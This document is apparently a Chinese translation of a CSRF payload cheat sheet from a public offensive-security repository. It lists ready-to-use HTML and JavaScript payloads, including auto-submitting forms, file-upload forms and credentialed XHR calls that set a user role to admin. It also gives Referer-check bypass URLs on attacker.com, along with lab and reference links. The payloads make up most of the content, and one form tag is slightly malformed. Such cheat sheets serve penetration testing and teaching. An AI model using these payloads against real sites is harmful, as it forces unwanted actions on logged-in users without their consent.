# 跨站请求伪造

> 跨站请求伪造（CSRF/XSRF）是一种攻击，它迫使终端用户在当前认证的网络应用程序上执行不希望的操作。CSRF攻击特别针对改变状态的请求，而不是数据盗窃，因为攻击者无法看到伪造请求的响应。- OWASP

## 摘要

- 工具
- 方法论
- 有效载荷
  - HTML GET - 需要用户交互
  - HTML GET - 无需用户交互
  - HTML POST - 需要用户交互
  - HTML POST - 自动提交 - 无需用户交互
  - HTML POST - 带有文件上传的multipart/form-data - 需要用户交互
  - JSON GET - 简单请求
  - JSON POST - 简单请求
  - JSON POST - 复杂请求
- 绕过引用头验证检查
  - 基本有效载荷
  - 带问号的载荷
  - 带分号的载荷
  - 带子域的载荷
- 实验室
- 参考资料

## 工具

- XSRFProbe - 首选的跨站请求伪造审计和开发工具包。

## 方法论

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true

## 有效载荷

当您登录到某个网站时，您通常会有一个会话。该会话的标识符存储在浏览器中的cookie中，并且会随着每个请求发送到该站点。即使其他站点触发了请求，cookie也会随请求一起发送，并且请求会被处理，就像登录用户执行了操作一样。

### HTML GET - 需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">点击我</a>
```

### HTML GET - 无需用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - 需要用户交互

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="CSRFd" />
<input type="submit" value="提交请求" />
</form>
```

### HTML POST - 自动提交 - 无需用户交互

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="CSRFd" />
<input type="submit" value="提交请求" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### HTML POST - 带有文件上传的multipart/form-data - 需要用户交互

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;

    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action<target>" enctype="multipart/form-data">
<input id="file" type="file" name="file"/>
<input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">提交请求</button>
```

### JSON GET - 简单请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - 简单请求

使用XHR：

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//简单请求中不允许使用application/json。默认是text/plain
xhr.setRequestHeader("Content-Type", "text/plain");
//您可能还想尝试以下一种或两种方法
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

使用自动提交表单发送，该方法绕过了某些浏览器保护措施，例如Firefox浏览器的增强跟踪保护标准选项：

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// 此输入将发送：{"role":admin,"other":"="}
<input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - 复杂请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 绕过referer header验证

### 基础有效载荷

```markdown
1) 打开 https://attacker.com/csrf.html
2) 引用头是..

Referer: https://attacker.com/csrf.html
```

### 使用问号(`?`)有效载荷

```markdown
1) 打开 https://attacker.com/csrf.html?trusted.domain.com
2) 引用头是..

Referer: https://attacker.com/csrf.html?trusted.domain.com
```

### 使用分号(`;`)有效载荷

```markdown
1) 打开 https://attacker.com/csrf.html;trusted.domain.com
2) 引用头是..

Referer: https://attacker.com/csrf.html;trusted.domain.com
```

### 使用子域名有效载荷

```markdown
1) 打开 https://trusted.domain.com.attacker.com/csrf.html
2) 引用头是..

Referer: https://trusted.domain.com.attacker.com/csrf.html
```




## 实验

* [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
* [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
* [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)


## 参考链接

- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/) 
- [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
- [Hacking PayPal Accounts with one click (Patched) - Yasser Ali](http://yasserali.com/hacking-paypal-accounts-with-one-click/)
- [Add tweet to collection CSRF - vijay kumar](https://hackerone.com/reports/100820)
- [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
- [How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
- [FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones](https://hackerone.com/reports/245346)
- [Hacking Facebook accounts using CSRF in Oculus-Facebook integration](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
- [Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
- [Cross-Site Request Forgery Attack - PwnFunction](https://www.youtube.com/watch?v=eWEgUcHPle0)
- [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
- [Bypass referer check logic for CSRF](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
